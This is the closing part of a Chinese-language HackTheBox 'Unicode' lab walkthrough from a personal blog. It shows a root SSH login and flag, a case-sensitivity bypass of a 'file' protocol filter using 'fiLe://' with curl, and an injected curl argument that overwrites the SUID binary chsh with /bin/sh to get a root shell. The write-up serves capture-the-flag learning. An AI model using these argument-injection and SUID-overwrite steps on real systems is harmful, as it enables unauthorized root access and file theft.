+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➤  python3 -m http.server <span class="hljs-number">80</span>                          <br>Serving HTTP on <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> port <span class="hljs-number">80</span> (http://<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">80</span>/) ...<br><span class="hljs-number">10.10.11.126</span> - - <span class="hljs-string">[19/May/2022 10:47:11]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /key HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure>
+
+<p>然后就能连接上root的ssh了。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➤  ssh root<span class="hljs-title">@hackmedia.htb</span><br><br>root<span class="hljs-title">@code</span>:~# cat root.txt<br><span class="hljs-number">926e6</span><span class="hljs-keyword">c</span><span class="hljs-number">18</span>a<span class="hljs-number">43</span>aa<span class="hljs-number">228</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">974</span><span class="hljs-keyword">c</span><span class="hljs-number">20500</span>a<span class="hljs-number">181</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="0x03-一些后记"><a href="#0x03-一些后记" class="headerlink" title="0x03 一些后记"></a>0x03 一些后记</h1><p>看了0xdf大哥的<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2022/05/07/htb-unicode.html#reverse-treport">帖子</a>，在提权上的思路有所收获。特此记录。</p>
+<h2 id="任意文件读"><a href="#任意文件读" class="headerlink" title="任意文件读"></a>任意文件读</h2><p>注意到treport.py中有这样一段代码：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> ip or <span class="hljs-string">&#x27;gopher&#x27;</span> <span class="hljs-keyword">in</span> ip or <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">in</span> ip:<br>	print(<span class="hljs-string">&#x27;INVALID URL&#x27;</span>)<br>	sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个代码本身是为了防止我们使用file等伪协议直接读取本地的文件的，但是注意到 Python 检查是区分大小写的，而curl 并不关心。 我可以将它与正文的命令注入结合起来读取文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;fiLe:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt&#125;<br></code></pre></td></tr></table></figure>
+
+<p>之后执行的命令如下，再查看文件即可拿到root.txt。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl fiLe:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt  -o <span class="hljs-regexp">/root/</span>reports/threat_report_[current_time]<br></code></pre></td></tr></table></figure>
+
+<h2 id="读写综合利用"><a href="#读写综合利用" class="headerlink" title="读写综合利用"></a>读写综合利用</h2><p>任意文件读写的综合利用还可以产生一个有趣的文件读取思路。</p>
+<p>首先查找具有<code>SUID</code>权限的文件。如<code>/usr/bin/chsh</code>，命令可以使用<code>find / -perm -4000 -user root 2&gt;/dev/null</code>。</p>
+<p>然后将<code>/usr/bin/chsh</code>使用<code>sh</code>覆写：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">Enter your <span class="hljs-symbol">choice:</span><span class="hljs-number">3</span><br>Enter the <span class="hljs-variable constant_">IP</span>/<span class="hljs-symbol">file_name:</span>&#123;<span class="hljs-symbol">File:</span>/<span class="hljs-regexp">//bin</span><span class="hljs-regexp">/sh,-o,/usr</span><span class="hljs-regexp">/bin/chsh</span>&#125;<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br><span class="hljs-number">100</span>  126k  <span class="hljs-number">100</span>  126k    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>   123M      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  123M<br>Enter your <span class="hljs-symbol">choice:</span><br></code></pre></td></tr></table></figure>
+
+<p>覆写后文件的SUID位不会变化，此时使用命令<code>chsh -p</code>（对应原来的<code>sh -p</code>）命令即可获得root的shell。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">code@code:~$ chsh -p<br><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=1000(code) <span class="hljs-attribute">gid</span>=1000(code) <span class="hljs-attribute">euid</span>=0(root) <span class="hljs-attribute">groups</span>=1000(code)<br></code></pre></td></tr></table></figure>
+
+
+
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - StartingPoint-Pathfinder</div>
+      <div>https://m0ck1ng-b1rd.github.io/2022/05/19/HTB/Unicode/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年5月19日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/29/%E5%80%92%E8%85%BE/VMWare%E4%B8%8AArch+xfce4%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96/" title="VMWare上Arch+xfce4的安装和美化">
+                        <span class="hidden-mobile">VMWare上Arch+xfce4的安装和美化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
